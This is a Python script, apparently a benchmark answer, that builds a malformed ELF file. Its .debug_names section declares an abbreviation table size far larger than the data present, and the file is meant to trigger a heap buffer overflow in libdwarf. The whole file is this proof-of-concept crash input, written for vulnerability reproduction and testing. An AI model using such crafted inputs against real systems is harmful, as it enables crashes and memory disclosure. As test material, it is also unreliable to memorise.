import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in libdwarf .debug_names parsing.
        The vulnerability involves incorrect limit calculations when reading the .debug_names section,
        specifically when abbrev_table_size is checked/used.
        """
        
        # 1. ELF Header (64-bit, LSB)
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = 1 # ET_REL
        e_machine = 62 # AMD64
        e_version = 1
        e_entry = 0
        e_phoff = 0
        e_shoff = 0 # To be calculated
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 0
        e_phnum = 0
        e_shentsize = 64
        e_shnum = 0 # To be calculated
        e_shstrndx = 0 # To be calculated

        # 2. Section Data Generation
        
        # .shstrtab section content
        # Offsets: 0: \0, 1: .shstrtab\0, 11: .debug_names\0
        shstrtab_data = b'\x00.shstrtab\x00.debug_names\x00'
        
        # .debug_names section content
        # DWARF5 .debug_names header and body
        # We construct a body with a valid structure but malicious abbrev_table_size
        dn_body = bytearray()
        
        # Header (excluding unit_length)
        dn_body.extend(struct.pack('<H', 5))       # version (2 bytes)
        dn_body.extend(struct.pack('<H', 0))       # padding (2 bytes)
        dn_body.extend(struct.pack('<I', 1))       # comp_unit_count (4 bytes)
        dn_body.extend(struct.pack('<I', 0))       # local_type_unit_count (4 bytes)
        dn_body.extend(struct.pack('<I', 0))       # foreign_type_unit_count (4 bytes)
        dn_body.extend(struct.pack('<I', 1))       # bucket_count (4 bytes)
        dn_body.extend(struct.pack('<I', 1))       # name_count (4 bytes)
        
        # MALICIOUS FIELD: abbrev_table_size
        # Set to a value larger than the remaining data in the section.
        # This forces the parser (if limits are miscalculated) to read past the end of the buffer.
        dn_body.extend(struct.pack('<I', 0x4000))  # abbrev_table_size (4 bytes)
        
        dn_body.extend(struct.pack('<I', 0))       # augmentation_string_size (4 bytes)
        # Augmentation string is empty (0 bytes)
        
        # Tables
        # CU List: 1 entry (comp_unit_count=1)
        dn_body.extend(struct.pack('<I', 0))       # Offset 0
        
        # Local/Foreign TU Lists are empty (counts=0)
        
        # Bucket Table: 1 entry (bucket_count=1)
        dn_body.extend(struct.pack('<I', 0))
        
        # Hash Table: 1 entry (name_count=1)
        dn_body.extend(struct.pack('<I', 0))
        
        # Name Table: 1 entry (name_count=1) -> 2 * 4 bytes
        dn_body.extend(struct.pack('<I', 0))       # String offset
        dn_body.extend(struct.pack('<I', 0))       # Entry offset
        
        # Abbrev Table: Should follow here, but we provide NO data.
        # The parser expects 0x4000 bytes based on header.
        
        # Prepend unit_length
        # unit_length covers the body length.
        dn_full = struct.pack('<I', len(dn_body)) + dn_body
        
        # 3. Assemble File Layout
        current_offset = 64 # Size of ELF header
        
        # Place .shstrtab
        shstrtab_offset = current_offset
        current_offset += len(shstrtab_data)
        
        # Align to 4 bytes
        pad1 = b''
        if current_offset % 4 != 0:
            pad_len = 4 - (current_offset % 4)
            pad1 = b'\x00' * pad_len
            current_offset += pad_len
            
        # Place .debug_names
        dn_offset = current_offset
        dn_size = len(dn_full)
        current_offset += dn_size
        
        # Align to 8 bytes for Section Header Table
        pad2 = b''
        if current_offset % 8 != 0:
            pad_len = 8 - (current_offset % 8)
            pad2 = b'\x00' * pad_len
            current_offset += pad_len
            
        e_shoff = current_offset
        
        # 4. Construct Section Header Table
        
        # Entry 0: NULL
        sht_data = bytearray()
        sht_data.extend(b'\x00' * 64)
        
        # Entry 1: .shstrtab
        # sh_name = 1
        # sh_type = SHT_STRTAB (3)
        sht_data.extend(struct.pack('<I', 1))      # sh_name
        sht_data.extend(struct.pack('<I', 3))      # sh_type
        sht_data.extend(struct.pack('<Q', 0))      # sh_flags
        sht_data.extend(struct.pack('<Q', 0))      # sh_addr
        sht_data.extend(struct.pack('<Q', shstrtab_offset)) # sh_offset
        sht_data.extend(struct.pack('<Q', len(shstrtab_data))) # sh_size
        sht_data.extend(struct.pack('<I', 0))      # sh_link
        sht_data.extend(struct.pack('<I', 0))      # sh_info
        sht_data.extend(struct.pack('<Q', 1))      # sh_addralign
        sht_data.extend(struct.pack('<Q', 0))      # sh_entsize
        
        # Entry 2: .debug_names
        # sh_name = 11
        # sh_type = SHT_PROGBITS (1)
        sht_data.extend(struct.pack('<I', 11))     # sh_name
        sht_data.extend(struct.pack('<I', 1))      # sh_type
        sht_data.extend(struct.pack('<Q', 0))      # sh_flags
        sht_data.extend(struct.pack('<Q', 0))      # sh_addr
        sht_data.extend(struct.pack('<Q', dn_offset)) # sh_offset
        sht_data.extend(struct.pack('<Q', dn_size))   # sh_size
        sht_data.extend(struct.pack('<I', 0))      # sh_link
        sht_data.extend(struct.pack('<I', 0))      # sh_info
        sht_data.extend(struct.pack('<Q', 1))      # sh_addralign
        sht_data.extend(struct.pack('<Q', 0))      # sh_entsize
        
        e_shnum = 3
        e_shstrndx = 1
        
        # 5. Finalize ELF Header
        elf_header = struct.pack('<16sHHIQQQQIHHHHHH', 
                                 e_ident, e_type, e_machine, e_version, e_entry,
                                 e_phoff, e_shoff, e_flags, e_ehsize,
                                 e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx)
        
        # 6. Combine all parts
        file_data = bytearray()
        file_data.extend(elf_header)
        file_data.extend(shstrtab_data)
        file_data.extend(pad1)
        file_data.extend(dn_full)
        file_data.extend(pad2)
        file_data.extend(sht_data)
        
        return bytes(file_data)
